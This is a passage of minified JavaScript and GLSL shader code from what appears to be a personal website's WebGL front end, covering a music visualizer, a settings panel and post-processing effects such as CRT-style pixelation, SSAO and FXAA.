x=[15,15,20,20,40,40,10,10,70,50,60,100,50,80,];var A=[0.35,0.35,0.5,0.5,1,1,0.6,0.6,3,1.7,1.9,4.5,1.8,2.1,];var m=[-150,-150,0,0,0,0,200,200,200,-200,-400,-500,-500,500,];var h=[20,20,20,20,20,20,90,90,100,50,50,200,50,50,];var k=129.7;var s=Math.max(0,Math.min(1,(q-k)/2));var K=104.5-2;var u=Math.max(0,(q-K)/15);u=(u<0.5?u*u:u-0.25);o.rotation.x=(Math.sqrt(2+u*u)/2-Math.sqrt(2)/2)*3.66+Math.sin(u*0.133+0.25*Math.sin(u*0.471));o.rotation.y=(Math.sqrt(u+1)-1+Math.sin(u*0.165+0.5*Math.sin(u*1.411)))*1.74;o.rotation.z=u*0.21;var H=134.9;var w=20;var r=0.5+0.5*Math.cos(Math.max(-π,Math.min(π,(q-H)*π/w)));o.rotation.y+=r*0.2;var B=365;var t=Math.min(1,Math.max(0,(q-B)/60));o.rotation.x+=(0.5-0.5*Math.cos(t*π))*π*0.3;o.rotation.z+=(0.5-0.5*Math.cos(t*π))*π*0.2;var I=180.5;s*=Math.max(0,Math.min(1,(I-q-1)/π));var J=Math.max(0,Math.min(1,(q-I-1)/π));var G=199.65;s+=Math.max(0,Math.min(1,(q-G-1)/π));J*=Math.max(0,Math.min(1,(G-q-1)/π));var F=243.65;s*=Math.max(0,Math.min(1,(F-q-1)/π));J+=Math.max(0,Math.min(1,(q-F-1)/π));var D=294.85;s+=Math.max(0,Math.min(1,(q-D-1)/π));J*=Math.max(0,Math.min(1,(D-q-1)/π));J=0.5-0.5*Math.cos(J*π);s=0.6-0.6*Math.cos(s*π);this.tracks.tracks.forEach(function(V,Z){if(Z>13){return}if(this.levels[Z]===undefined){this.phases[Z]=this.finals[Z]=this.smooths[Z]=this.smoothboosts[Z]=0;this.levels[Z]=[0,0,0];this.boosts[Z]=[0,0,0]}var e=(p[x[Z]*8]/255*A[Z])||0;e=Math.max(0,e*1.1-0.1);var X=this.levels[Z];X.push(e);if(X.length>3){X.shift()}var Y=X.reduce(function(ag,af){return ag+af},0)/X.length;var ae=Math.min(4,M.delta/0.01666);var S=0.045*ae;var N=this.smooths[Z]=this.smooths[Z]+(Y-this.smooths[Z])*S;var T=this.finals[Z]=this.finals[Z]+(N-this.finals[Z])*S;var O=Math.max(0,-this.finals[Z]+this.smooths[Z]);var ab=this.boosts[Z];ab.push(O);if(ab.length>5){ab.shift()}var aa=ab.reduce(function(ag,af){return ag+af},0)/ab.length;smoothBoost=this.smoothboosts[Z]=this.smoothboosts[Z]+(aa-this.smoothboosts[Z])*0.1;var ad=T*1500+smoothBoost*4;var P=(ad+h[Z])*y+h[Z];if(V._length===undefined){V._length=V.length;V._initial=V.initial;V.distance=0;V.speed=0}this.phases[Z]+=(Math.sqrt(Math.abs(T))*0.01+0.0025)*ae;var ac=this.phases[Z];var Q=V.initial+V._length/2-P+m[Z];var R=(Z>7)?400*pow(s*(Math.sin(1+ac*2.31+Z+Math.cos(ac*0.181))+Math.sin(ac*0.718)),2):0;var U=Math.sin(ac)*(200+P/3)*(1-J*0.75)+900*J*pow(Math.sin(q*0.64),0.85);V.travel=Q+U+R;V.length=P*2;var W=0.5+0.5*Math.cos(Math.min(1,y*2)*π);V.travel=V.travel+(V.initial-V.travel)*W;V.length=V.length+(V._length-V.length)*W}.bind(this));var E=Math.max(0,Math.min(1,M.scroll.y/(M.pageStart/2)*2-1.3));this.slerpT=(q>j-15)?1:E;var a=(q>j-15)?(0.005+0.095*E):0.1;this.slerpA=this.slerpA+(this.slerpT-this.slerpA)*a;this.slerpB=this.slerpB+(this.slerpA-this.slerpB)*a;this.cameraController.lock((this.playing&&u>0.01)?0.01:0);o.quaternion.setFromEuler(o.rotation,o.eulerOrder);o.quaternion.slerp(this.q1,this.slerpB);b.rotation.copy(o.rotation);g.rotation.copy(o.rotation);b.quaternion.copy(o.quaternion);g.quaternion.copy(o.quaternion);o.useQuaternion=b.useQuaternion=g.useQuaternion=this.slerpB>0;if(q>j+15){this.stop()}this.lastTime=q},tick:function(a){if(!this.playing){return}if(this.level<0.05||this.quietFrames<0){this.quietFrames++}else{this.quietFrames=Math.min(0,this.quietFrames)}if(this.quietFrames>180){this.stop();this.quietFrames=0}},resize:function(a){},injectAudio:function(){if(this.audio){return}var c=this.audio=new Audio();var b;var a=[["audio/ogg","/audio/dangerous-days.ogg"],["audio/mpeg","/audio/dangerous-days.mp3"],];a.forEach(function(e){if(c.canPlayType(e[0])){b=e[1]}});if(!b){growl({type:"info",text:"Your browser does not support MP3 or OGG audio playback."});return}c.style.display="none";document.body.appendChild(c);c.autoplay=true;c.src=b;c.addEventListener("play",function(){try{c.currentTime=this.skip}catch(f){}c.volume=0;growl({type:"music",text:"<strong>Seba</strong><br>Dangerous Days",delay:500,link:"http://www.secretoperations.com/",})}.bind(this))},});Acko.Effects.push(new Acko.Effect.Visualizer());(function(){var attrReplace="data-replace";var getOffset=function(el){var top=0,left=0,width=el.offsetWidth,height=el.offsetHeight;do{top+=el.offsetTop||0;left+=el.offsetLeft||0;el=el.offsetParent}while(el&&!el.classList.contains("grid"));return{top:top,left:left,width:width,height:height}};Acko.Effect.Replace=function(){Acko.Effect.call(this);this.order=0;this.group=null;this.marginTop=0;this.camera=null;this.adopted=[];this.lastVisible=-1};Acko.Effect.Replace.prototype=_.extend(new Acko.Effect(),{build:function(exports){exports.replace=this;this.camera=exports.camera;this.group=new THREE.Object3D();exports.scene.add(this.group);Acko.Behaviors.push(function(el){this.applyBehavior(el)}.bind(this))},update:function(exports){var visible=!exports.ride&&(!exports.visualizer.playing||exports.visualizer.slerpB>0.99||exports.visualizer.quietFrames<0)&&exports.cameraController.bound;function vis(o,v){o.visible=v;o.children.forEach(function(o){vis(o,v)})}if(this.lastVisible!=visible){this.lastVisible=visible;this.adopted.forEach(function(r){vis(r.object,visible)})}},resize:function(exports){this.marginLeft=-20;this.marginTop=-exports.cameraScrollYOffset+exports.pageStart-exports.viewHeight/2;this.refresh()},refresh:function(){this.adopted.forEach(function(rp){this.layout(rp)}.bind(this))},layout:function(rp){var o=getOffset(rp.element);var scale=Math.max(0.001,Math.min(o.width/rp.width,o.height/rp.height));var p=rp.object.position;var r=rp.object.rotation;var s=rp.object.scale;p.set.apply(p,rp.position);r.set.apply(r,rp.rotation);s.set.apply(s,rp.scale);p.x+=o.left-Math.min(window.innerWidth/2,480)+Math.round(o.width/2)+this.marginLeft;p.y-=o.top+Math.round(o.height/2)+this.marginTop;rp.offset=o;s.multiplyScalar(scale)},replace:function(element,replace){replace.element=element;element.style.visibility="hidden";element.onload=function(){this.layout(replace)}.bind(this);this.layout(replace);this.adopted.push(replace);this.group.add(replace.object)},reset:function(){this.adopted.forEach(function(r){this.group.remove(r.object)}.bind(this));this.adopted=[]},applyBehavior:function(el){forEach(el.querySelectorAll("img["+attrReplace+"]"),function(el){var replace=eval(el.getAttribute(attrReplace));el.removeAttribute(attrReplace);var attr;replace.position=(attr=el.getAttribute("data-position"))?eval(attr):[0,0,0];replace.rotation=(attr=el.getAttribute("data-rotation"))?eval(attr):[0,0,0];replace.scale=(attr=el.getAttribute("data-scale"))?eval(attr):[1,1,1];this.replace(el,replace)}.bind(this))},});var replace=new Acko.Effect.Replace();Acko.Effects.push(replace)})();Acko.Effect.Config=function(){Acko.Effect.call(this);this.order=Infinity;this.group=null;this.opacity=0;this.renderer="webgl";this.skip=0;this.last=Infinity};Acko.Effect.Config.prototype=_.extend(new Acko.Effect(),{build:function(h){var k='<div class="bg"></div>';var j='<div class="status"><span class="box"></span><span class="resolution"></span></div>';var e='<div class="debug"><input type="checkbox"></div>';var b='<div class="style"><label>Style<select><option value="normal">Normal</option><option value="ssao">SSAO</option><option value="ega">EGA</option></select></label></div>';var g='<div class="mute"><label>Mute Sound<input type="checkbox"></label></div>';var f='<div class="fps"><label>Stats<input type="checkbox"></label></div>';var m='<div class="gear"><span class="icon-gear"><span></span><span></span><span></span><span></span><span></span></span></div>';var o='<div class="achievements"></div>';var a=this.div=document.createElement("div");a.className="config collapsed";a.style.opacity=0;document.body.appendChild(a);a.innerHTML=k+o+e+j+b+g+f+m;this.resolution=a.querySelector(".resolution");this.select=a.querySelector(".style select");this.mute=a.querySelector(".mute input");this.fps=a.querySelector(".fps input");this.gear=a.querySelector(".gear");this.achievements=a.querySelector(".achievements");this.debug=a.querySelector(".debug input");this.gl=h.parent;this.compose=h.compose;this.tracks=h.tracks;var l=getStorage("config");this.apply(l,true);this.bind()},apply:function(e,b){var a=this.compose;if(e.style){switch(e.style){case"normal":a.ssao=false;a.eightbit=false;break;case"ssao":a.ssao=true;a.eightbit=false;break;case"ega":a.ssao=false;a.eightbit=true;break;default:}}this.tracks.debug=+e.debug||0;stats.domElement.style.display=e.fps?"block":"none";Acko.globalVolume=e.mute?0:1;if(b){this.select.selectedIndex={normal:0,ssao:1,ega:2}[e.style];this.fps.checked=!!e.fps;this.mute.checked=!!e.mute;this.debug.checked=!!e.debug}this.gl.resize(true)},bind:function(){this.select.addEventListener("change",function(){var a=this.select.options[this.select.selectedIndex].value;var b=getStorage("config");b.style=a;setStorage("config",b);this.apply(b);this.select.blur()}.bind(this));this.mute.addEventListener("change",function(){var a=this.mute.checked;var b=getStorage("config");b.mute=a;setStorage("config",b);this.apply(b);this.mute.blur()}.bind(this));this.fps.addEventListener("change",function(){var a=this.fps.checked;var b=getStorage("config");b.fps=a;setStorage("config",b);this.apply(b);this.fps.blur()}.bind(this));this.debug.addEventListener("change",function(){var a=this.debug.checked;var b=getStorage("config");b.debug=a;setStorage("config",b);this.apply(b);this.debug.blur()}.bind(this));this.gear.addEventListener("click",function(){var a=this.div.classList;var b=a.contains("collapsed")?"remove":"add";a[b]("collapsed")}.bind(this))},tick:function(a){a.updateStats=this.fps.checked},update:function(f){if(f.time<8&&!f.pastMasthead){var h=0.5-0.5*Math.cos(Math.max(0,Math.min(1,(f.time-6.7)/0.9))*π);this.div.style.opacity=h}else{if(this.div.style.opacity!=1){this.div.style.opacity=1}}if(!(this.skip%30)){if(this.last!==localStorage.achievements){this.last=localStorage.achievements;var g=[];var b=getStorage("achievements"),e;for(e in b){var c=b[e],j;if(getAchievement(e)&&(j=getAchievement(c))){g.push([e,'<span style="background-image: url(/achievements/'+c+'.png)" title="'+j+'"></span>'])}}while(g.length<8){g.push([" ","<span></span>"])}g.sort(function(l,k){return l[0]<k[0]?1:-1});g=g.map(function(a){return a[1]}).join("");this.achievements.innerHTML=g}}this.skip++},resize:function(a){var b=a.width+" × "+a.height;var c=(a.compose.msaa&&!a.compose.ssao&&!a.compose.eightbit)?("MSAA×"+a.compose.msaa):(a.compose.fxaa?"FXAA":"No AA");this.resolution.innerHTML=b+" <span>"+c+"</span>"},});Acko.Effects.push(new Acko.Effect.Config());Acko.globalVolume=1;Acko.EightBitShader={uniforms:{tDiffuse:{type:"t",value:null},resolution:{type:"v2",value:new THREE.Vector2(1/1024,1/512)},pixelSize:{type:"f",value:16},},vertexShader:["void main() {","gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);","}"].join("\n"),fragmentShader:["uniform sampler2D tDiffuse;","uniform vec2 resolution;","uniform float pixelSize;","void main() {","vec2 uv1 = gl_FragCoord.xy * resolution - .5;","vec2 uv2 = gl_FragCoord.xy * resolution - .5 + vec2(.01, 0);","vec2 uv3 = gl_FragCoord.xy * resolution - .5 + vec2(0, -.01);","vec2 crt1 = uv1 * (1.0 + dot(uv1, uv1)*.5) * .89;","vec2 crt2 = uv2 * (1.0 + dot(uv2, uv2)*.5) * .89;","vec2 crt3 = uv3 * (1.0 + dot(uv3, uv3)*.5) * .89;","vec2 pixelR = floor((crt1 + vec2(.501, .5)) / resolution / pixelSize);","vec2 pixelG = floor((crt1 + vec2(.5, .5)) / resolution / pixelSize);","vec2 pixelB = floor((crt1 + vec2(.499, .5)) / resolution / pixelSize);","vec4 sampleR = texture2D(tDiffuse,  pixelR * resolution * pixelSize) + mod(pixelR.x + pixelR.y, 2.0) * .006;","vec4 sampleG = texture2D(tDiffuse,  pixelG * resolution * pixelSize) + mod(pixelG.x + pixelG.y, 2.0) * .006;","vec4 sampleB = texture2D(tDiffuse,  pixelB * resolution * pixelSize) + mod(pixelB.x + pixelB.y, 2.0) * .006;","vec3 sample = vec3(sampleR.r, sampleG.g, sampleB.b);","vec3 color = floor(sample * sample * 3.0 + .5) / 3.0;","float bars = sqrt(sqrt(.5-cos((crt1.y + .5) * 6.28318 / resolution.y / pixelSize)*.5))*.25+.75;","float ratio = 20.0 - uv1.y * uv1.y * 10.0;","float tube = length(abs(crt1)*abs(crt1)*abs(crt1)*abs(crt1));","float mask = clamp(6.0 - ratio * tube * 4.0, 0.0, 1.0);","float deltaX = length(abs(crt2)*abs(crt2)*abs(crt2)*abs(crt2)) - tube;","float deltaY = length(abs(crt3)*abs(crt3)*abs(crt3)*abs(crt3)) - tube;","vec3 n = vec3(-deltaX * 100.0, -deltaY * 100.0, 1.0);","float shade = max(-0.5, dot(n, normalize(vec3(10.0, 10.0, 1.0)))) * .5;","shade = shade * abs(shade);","gl_FragColor = vec4(bars * mask * sqrt(shade + color), 1.0);","}"].join("\n")};Acko.SSAOShader={uniforms:{tDiffuse:{type:"t",value:null},tDepth:{type:"t",value:null},size:{type:"v2",value:new THREE.Vector2(512,512)},resolution:{type:"v2",value:new THREE.Vector2(1/512,1/512)},cameraNear:{type:"f",value:1},cameraFar:{type:"f",value:100},seed:{type:"f",value:1},},vertexShader:["varying vec2 vUV;","void main() {","vUV = uv;","vec2 xy = uv * 2.0 - 1.0;","gl_Position = vec4(xy, 1.0, 1.0);","}",].join("\n"),fragmentShader:["uniform float cameraNear;","uniform float cameraFar;","uniform float seed;","uniform vec2 size;","uniform sampler2D tDiffuse;","uniform sampler2D tDepth;","varying vec2 vUV;","#define DL 2.399963229728653","#define EULER 2.718281828459045","float width = size.x;","float height = size.y;","float cameraFarPlusNear = cameraFar + cameraNear;","float cameraFarMinusNear = cameraFar - cameraNear;","float cameraCoef = 2.0 * cameraNear;","const int samples = 8;","const float radius = 4.0;","const bool useNoise = false;","const float noiseAmount = 0.0003 * 4.0;","const float diffArea = 0.4;","const float gDisplace = 0.4;","float unpackDepth(const in vec4 rgba_depth) {","const vec4 bit_shift = vec4(1.0 / (256.0 * 256.0 * 256.0), 1.0 / (256.0 * 256.0), 1.0 / 256.0, 1.0);","float depth = dot(rgba_depth, bit_shift);","return depth;","}","vec2 rand(const vec2 coord) {","vec2 noise;","if (useNoise) {","float nx = dot (coord, vec2(12.9898, 78.233));","float ny = dot (coord, vec2(12.9898, 78.233) * 2.0);","noise = clamp(fract (43758.5453 * sin(seed + vec2(nx, ny))), 0.0, 1.0);","} else {","float ff = fract(1.0 - coord.s * (width / 2.0));","float gg = fract(coord.t * (height / 2.0));","noise = vec2(0.25, 0.75) * vec2(ff) + vec2(0.75, 0.25) * gg;","}","return (noise * 2.0 - 1.0) * noiseAmount;","}","float readDepth(const in vec2 coord) {","return cameraCoef / (cameraFarPlusNear - unpackDepth(texture2D(tDepth, coord)) * cameraFarMinusNear);","}","float compareDepths(const in float depth1, const in float depth2, inout int far) {","float garea = 2.0;","float diff = (depth1 - depth2) * 100.0;","if (diff < gDisplace) {","garea = diffArea;","} else {","far = 1;","}","float dd = diff - gDisplace;","float gauss = pow(EULER, -2.0 * dd * dd / (garea * garea));","return gauss;","}","float calcAO(float depth, float dw, float dh) {","float dd = radius - depth * radius;","vec2 vv = vec2(dw, dh);","vec2 coord1 = vUV + dd * vv;","vec2 coord2 = vUV - dd * vv;","float temp1 = 0.0;","float temp2 = 0.0;","int far = 0;","temp1 = compareDepths(depth, readDepth(coord1), far);","if (far > 0) {","temp2 = compareDepths(readDepth(coord2), depth, far);","temp1 += (1.0 - temp1) * temp2;","}","return temp1;","}","void main() {","vec2 noise = rand(vUV);","float depth = readDepth(vUV);","float tt = clamp(depth, .3, 1.0);","float w = (1.0 / width)  / tt + (noise.x * (1.0 - noise.x));","float h = (1.0 / height) / tt + (noise.y * (1.0 - noise.y));","float pw;","float ph;","float ao;","float dz = 1.0 / float(samples);","float z = 1.0 - dz / 2.0;","float l = 0.0;","for (int i = 0; i <= samples; i ++) {","float r = ((1.0 - z) + sqrt(1.0 - z)) * .5;","pw = cos(l) * r;","ph = sin(l) * r;","ao += calcAO(depth, pw * w, ph * h);","z = z - dz;","l = l + DL;","}","ao /= float(samples);","ao = 1.0 - ao * .8;","gl_FragColor = vec4(ao, ao, ao, 1.0);","}"].join("\n")};Acko.SSAOUpShader={uniforms:{tDiffuse:{type:"t",value:null},tDepth:{type:"t",value:null},tAO:{type:"t",value:null},size:{type:"v2",value:new THREE.Vector2(512,512)},resolution:{type:"v2",value:new THREE.Vector2(1/512,1/512)},cameraNear:{type:"f",value:1},cameraFar:{type:"f",value:100},seed:{type:"f",value:1},lumInfluence:{type:"f",value:0.9},},vertexShader:["varying vec2 vUV;","void main() {","vUV = uv;","vec2 xy = uv * 2.0 - 1.0;","gl_Position = vec4(xy, 1.0, 1.0);","}",].join("\n"),fragmentShader:["uniform float cameraNear;","uniform float cameraFar;","uniform float seed;","uniform vec2 resolution;","uniform vec2 size;","uniform sampler2D tDiffuse;","uniform sampler2D tDepth;","uniform sampler2D tAO;","uniform float lumInfluence;","varying vec2 vUV;","float dx = resolution.x;","float dy = resolution.y;","float width = size.x;","float height = size.y;","float cameraFarPlusNear = cameraFar + cameraNear;","float cameraFarMinusNear = cameraFar - cameraNear;","float cameraCoef = 2.0 * cameraNear;","float unpackDepth(const in vec4 rgba_depth) {","const vec4 bit_shift = vec4(1.0 / (256.0 * 256.0 * 256.0), 1.0 / (256.0 * 256.0), 1.0 / 256.0, 1.0);","float depth = dot(rgba_depth, bit_shift);","return depth;","}","float readDepth(const in vec2 coord) {","return cameraCoef / (cameraFarPlusNear - unpackDepth(texture2D(tDepth, coord)) * cameraFarMinusNear);","}","void main() {","vec2 uv = floor((vUV + resolution * .5) * size) * resolution - resolution * .5;","float d = readDepth(vUV);","float aoNW = texture2D(tAO, uv + vec2(0, 0)).r;","float aoNE = texture2D(tAO, uv + vec2(dx, 0)).r;","float aoSW = texture2D(tAO, uv + vec2(0, dy)).r;","float aoSE = texture2D(tAO, uv + vec2(dx, dy)).r;","float dNW = readDepth(uv + vec2(0, 0)) - d;","float dNE = readDepth(uv + vec2(dx, 0)) - d;","float dSW = readDepth(uv + vec2(0, dy)) - d;","float dSE = readDepth(uv + vec2(dx, dy)) - d;","float wNW = max(0.000001, .00001-dNW*dNW);","float wNE = max(0.000001, .00001-dNE*dNE);","float wSW = max(0.000001, .00001-dSW*dSW);","float wSE = max(0.000001, .00001-dSE*dSE);","float wT = 1.0 / (wNW+wNE+wSW+wSE);","float ao = (aoNW*wNW + aoNE*wNE + aoSW*wSW + aoSE*wSE) * wT;","vec4 sample = texture2D(tDiffuse, vUV);","vec3 color = sample.rgb*sample.rgb;","vec3 lumcoeff = vec3(0.299, 0.587, 0.114);","float lum = dot(color.rgb, lumcoeff);","vec3 luminance = vec3(lum);","vec3 final = vec3(color * mix(vec3(ao), vec3(1.0), luminance*lumInfluence));","gl_FragColor = vec4(sqrt(final),  1.0);","}"].join("\n")};THREE.FXAAShader={uniforms:{tDiffuse:{type:"t",value:null},resolution:{type:"v2",value:new THREE.Vector2(1/1024,1/512)}},vertexShader:["varying vec2 vUv;","void main() {","vUv = uv;","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform sampler2D tDiffuse;","uniform vec2 resolution;","varying vec2 vUv;","#define FXAA_REDUCE_MIN   (1.0/128.0)","#define FXAA_REDUCE_MUL   (1.0/8.0)","#define FXAA_SPAN_MAX     8.0","void main() {","vec4 rgbaNW = texture2D( tDiffuse, ( gl_FragCoord.xy + vec2( -1.0, -1.0 ) ) * resolution );","vec4 rgbaNE = texture2D( tDiffuse, ( gl_FragCoord.xy + vec2( 1.0, -1.0 ) ) * resolution );","vec4 rgbaSW = texture2D( tDiffuse, ( gl_FragCoord.xy + vec2( -1.0, 1.0 ) ) * resolution );","vec4 rgbaSE = texture2D( tDiffuse, ( gl_FragCoord.xy + vec2( 1.0, 1.0 ) ) * resolution );","vec4 rgbaM  = texture2D( tDiffuse,  gl_FragCoord.xy  * resolution );","vec3 rgbNW  = rgbaNW.xyz;","vec3 rgbNE  = rgbaNE.xyz;","vec3 rgbSW  = rgbaSW.xyz;","vec3 rgbSE  = rgbaSE.xyz;","vec3 rgbM   = rgbaM.xyz;","vec3 luma = vec3( 0.299, 0.587, 0.114 );","float lumaNW = dot( rgbNW, luma );","float lumaNE = dot( rgbNE, luma );","float lumaSW = dot( rgbSW, luma );","float lumaSE = dot( rgbSE, luma );","float lumaM  = dot( rgbM,  luma );","float lumaMin = min( lumaM, min( min( lumaNW, lumaNE ), min( lumaSW, lumaSE ) ) );","float lumaMax = max( lumaM, max( max( lumaNW, lumaNE) , max( lumaSW, lumaSE ) ) );","vec2 dir;","dir.x = -((lumaNW + lumaNE) - (lumaSW + lumaSE));","dir.y =  ((lumaNW + lumaSW) - (lumaNE + lumaSE));","float dirReduce = max( ( lumaNW + lumaNE + lumaSW + lumaSE ) * ( 0.25 * FXAA_REDUCE_MUL ), FXAA_REDUCE_MIN );","float rcpDirMin = 1.0 / ( min( abs( dir.x ), abs( dir.y ) ) + dirReduce );","dir = min( vec2( FXAA_SPAN_MAX,  FXAA_SPAN_MAX),","max( vec2(-FXAA_SPAN_MAX, -FXAA_SPAN_MAX),","dir * rcpDirMin)) * resolution;","vec3 rgbA = 0.5 * (","texture2D( tDiffuse, gl_FragCoord.xy  * resolution + dir * ( 1.0 / 3.0 - 0.5 ) ).xyz +","texture2D( tDiffuse, gl_FragCoord.xy  * resolution + dir * ( 2.0 / 3.0 - 0.5 ) ).xyz );","vec3 rgbB = rgbA * 0.5 + 0.25 * (","texture2D( tDiffuse, gl_FragCoord.xy  * resolution + dir * -0.5 ).xyz +","texture2D( tDiffuse, gl_FragCoord.xy  * resolution + dir * 0.5 ).xyz );","float lumaB = dot( rgbB, luma );","if ( ( lumaB < lumaMin ) || ( lumaB > lumaMax ) ) {","gl_FragColor = vec4( rgbA, 1.0 );","} else {","gl_FragColor = vec4( rgbB, 1.0 );","}","}"].join("\n")};Acko.TrackShader={uniforms:{tGeometry:{type:"t",value:null},sampleStep:{type:"v2",value:new THREE.Vector2()},opacity:{type:"f",value:1},blackhole:{type:"f",value:1},ambientCorrection:{type:"f",value:0},ambientOcclusion:{type:"f",value:1},center:{type:"v3",value:_v(),},fogBegin:{type:"f",value:2200},displacement:{type:"f",value:0},},vertexShader:["uniform sampler2D tGeometry;","uniform vec2 sampleStep;","uniform float blackhole;","uniform float ambientOcclusion;","varying vec3 vNormal;","varying vec3 vView;","varying vec3 vColor;","varying float vAO;","varying vec3 vZenith;","varying vec3 vSun;","attribute vec3 color;","uniform vec3 center;","uniform float displacement;","void main() {","vec2 uv = position.xy;","vec4 posSample = texture2D(tGeometry, uv);","vec4 normalSample = texture2D(tGeometry, uv + vec2(sampleStep.x, 0));","vNormal = normalize(normalMatrix * normalSample.xyz);","vec3 pos = posSample.xyz;","if (blackhole > 0.701) {","float ramp = sin(clamp((blackhole - .701), 0.0, 1.0)*1.57);","vec3 pos2 = pos - center;","pos2.y *= 2.0;","float scale = length(pos2) / 300.0 - blackhole + 1.25;","scale = clamp(scale, 0.0, 1.25);","if (scale > .75) scale = 1.0 - (1.25 - scale)*(1.25 - scale);","pos = pos2 * mix(1.0, scale, ramp);","pos.y *= .5;","pos += center;","}","/* To show displacement in action */","pos = mix(pos, position.xyz * vec3(800.0, 500.0, 1.0) - vec3(400.0, 100.0, 0.0), displacement);","vec4 mvPos = modelViewMatrix * vec4(pos, 1.0);","gl_Position = projectionMatrix * mvPos;","vAO = mix(1.0, posSample.w, ambientOcclusion);","vView = -mvPos.xyz;","vColor = color;","vSun = (normalMatrix * vec3(.416, .371, .619));","vZenith = (normalMatrix * vec3(0.0, 1, 0.0));","}"].join("\n"),depthVertexShader:["uniform sampler2D tGeometry;","uniform float blackhole;","uniform vec3 center;","void main() {","vec2 uv = position.xy;","vec4 posSample = texture2D(tGeometry, uv);","vec3 pos = posSample.xyz;","if (blackhole > 0.701) {","vec3 pos2 = pos - center;","pos2.y *= 2.0;","float scale = length(pos2) / 300.0 - blackhole + 1.25;","scale = clamp(scale, 0.0, 1.25);","if (scale > .75) scale = 1.0 - (1.25 - scale)*(1.25 - scale);","pos = pos2 * scale;","pos.y *= .5;","pos += center;","}","gl_Position = projectionMatrix * modelViewMatrix * vec4(pos, 1.0);","}"].join("\n"),fragmentShader:["uniform float opacity;","uniform float ambientCorrection;","uniform float blackhole;","uniform float fogBegin;","varying vec3 vNormal;","varying vec3 vView;","varying vec3 vColor;","varying float vAO;","varying vec3 vZenith;","varying vec3 vSun;","float leClamp(float x) {","return clamp(x, 0.0, 1.0);","}","float noise() {","return fract(sin(dot(cameraPosition.xz, gl_FragCoord.xy + vec2(3.1380 + blackhole, 7.41)) * 13.414) * 1414.32);","}","void main() {","vec3 diffuse = leClamp(dot(normalize(vNormal), vSun)) * vec3(1.5, 1., .7)+ leClamp(dot(vNormal, vZenith)) * vec3(.1, .4, .5);","diffuse = diffuse * (.5 - ambientCorrection) + (.5 + ambientCorrection);","vec3 halfDir = normalize(normalize(vView) + vSun);","float specular = pow(leClamp(dot(vNormal, halfDir)), 4.0) * (1.0 + ambientCorrection);","vec3 specColor = sqrt(vColor) * .15;","float nlen = length(vNormal);","float outline = clamp(3.0 - nlen * nlen * 3.0, 0.0, 1.0);","float lum = dot(diffuse, vec3(0.299, 0.587, .114));","vec3 ao = mix(vColor*(vAO*vAO+vAO)*.5, vec3(vAO), lum);","vec3 color = (noise() * .04 + .96) * ao * (diffuse * vColor * (1.0 + outline * .35) + specular * specColor);","float distance = length(vView);","float fog = min(1.0, exp(-(distance - fogBegin) * .00022));","gl_FragColor = vec4(sqrt(mix(vec3(1.0,1.0,1.0), color, fog * opacity)), 1.0);","}"].join("\n"),};Acko.SolidShader={uniforms:{opacity:{type:"f",value:0},ambientCorrection:{type:"f",value:0},fogBegin:{type:"f",value:2200},},vertexShader:["varying vec3 vNormal;","varying vec3 vView;","attribute vec3 color;","varying vec3 vColor;","varying vec3 vZenith;","varying vec3 vSun;","void main() {","vNormal = normalMatrix * normal;","vec4 mvPos = modelViewMatrix * vec4(position, 1.0);","gl_Position = projectionMatrix * mvPos;","vView = -mvPos.xyz;","vColor = color;","vSun = (viewMatrix * vec4(.416, .371, .619, 0.0)).xyz;","vZenith = (viewMatrix * vec4(0.0, 1, 0.0, 0.0)).xyz;","}"].join("\n"),depthVertexShader:["void main() {","gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);","}"].join("\n"),fragmentShader:["uniform float opacity;","uniform float ambientCorrection;","uniform float fogBegin;","varying vec3 vNormal;","varying vec3 vView;","varying vec3 vColor;","varying vec3 vZenith;","varying vec3 vSun;","float leClamp(float x) {","return clamp(x, 0.0, 1.0);","}","void main() {","vec3 diffuse = leClamp(dot(normalize(vNormal), vSun)) * vec3(1.5, 1., .6)+ leClamp(dot(vNormal, vZenith)) * vec3(.1, .4, .5);","diffuse = diffuse * (.5 - ambientCorrection) + .5 + ambientCorrection;","vec3 halfDir = normalize(normalize(vView) + vSun);","float specular = pow(leClamp(dot(vNormal, halfDir)), 8.0) * (1.0 + ambientCorrection);","vec3 specColor = sqrt(vColor) * .35;","float nlen = length(vNormal);","float outline = clamp(3.0 - nlen * nlen * 3.0, 0.0, 1.0);","vec3 color = (diffuse * vColor * (1.0 + outline * .35) + specular * specColor);","float distance = length(vView);","float fog = min(1.0, exp(-(distance - fogBegin) * .00022));","gl_FragColor = vec4(sqrt(mix(vec3(1.0,1.0,1.0), color, fog * opacity)), 1.0);","}"].join("\n")};var colorize=function(){return navigator.userAgent.match(/Chrome/)};var bar=function(){var e="◤◢◣◥",b="";var a=0;for(var c=0;c<80;++c){a=Math.floor(a+Math.random()*3.2+1)%4;b+=e[a]}if(colorize()){console.log("%c"+b,"background: -webkit-linear-gradient(rgb(81,162,189), rgb(68,105,133)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 1px 1px 0px rgba(0,0,0, .2);")}else{console.log(b)}};var flair=function(){var 